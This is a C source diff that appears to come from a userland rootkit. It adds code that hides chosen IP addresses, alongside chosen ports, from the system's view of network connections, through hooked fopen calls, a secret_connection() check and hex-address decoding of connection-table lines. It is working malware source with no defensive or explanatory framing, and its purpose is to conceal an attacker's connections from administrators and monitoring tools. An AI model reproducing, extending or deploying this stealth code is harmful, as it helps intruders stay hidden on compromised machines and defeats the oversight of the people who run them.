@@ -1,10 +1,10 @@
 int is_hidden_port(int port){
+    preparehideports(readgid());
+
     FILE *fp;
-    char buf[13], // max len line can be is len("xxxxx-xxxxx")
-         *buf_tok = NULL;
+    char buf[13], *buf_tok = NULL;
     int hidden_status = 0,
-        low_port,
-        high_port;
+        low_port, high_port;
 
     hook(CFOPEN);
     fp = call(CFOPEN, HIDEPORTS, "r");
@@ -38,7 +38,59 @@ int is_hidden_port(int port){
     return hidden_status;
 }
 
+#ifdef HIDE_ADDRS
+static char *getanip(const char *addr){
+    char *ret, buf[32];
+    int a,b,c,d;
+
+    sscanf(addr, "%2x%2x%2x%2x", &a,&b,&c,&d);
+    memset(buf, 0, sizeof(buf));
+    snprintf(buf, sizeof(buf), "%u.%u.%u.%u", d,c,b,a);
+
+    size_t rsize = strlen(buf)+1;
+    ret = malloc(rsize);
+    if(!ret) return NULL;
+    memset(ret, 0, rsize);
+    strncpy(ret, buf, rsize);
+    return ret;
+}
+
+int is_hidden_addr(const char *addr){
+    preparehideaddrs(readgid());
+
+    FILE *fp;
+    char line[32], *ip;
+    int status = 0;
+
+    hook(CFOPEN);
+    fp = call(CFOPEN, HIDEADDRS, "r");
+    if(fp == NULL){
+        return 0;
+    }
+
+    ip = getanip(addr);
+    if(ip == NULL){
+        fclose(fp);
+        return 0;
+    }
+
+    while(fgets(line, sizeof(line), fp) != NULL && status != 1){
+        line[strlen(line)-1] = '\0';
+        if(!strncmp(ip, line, strlen(ip)))
+            status = 1;
+    }
+
+    fclose(fp);
+    free(ip);
+    return status;
+}
+#endif
+
+
 int secret_connection(char line[]){
+    if(rknomore())
+        return 0;
+
     char raddr[128], laddr[128], etc[512];
     unsigned long rxq, txq, t_len,
                   retr, inode;
@@ -51,6 +103,11 @@ int secret_connection(char line[]){
 
     if(is_hidden_port(lport) || is_hidden_port(rport))
         return 1;
+
+#ifdef HIDE_ADDRS
+    if(strlen(raddr) > 0 && is_hidden_addr(raddr))
+        return 1;
+#endif
 
     return 0;
 }
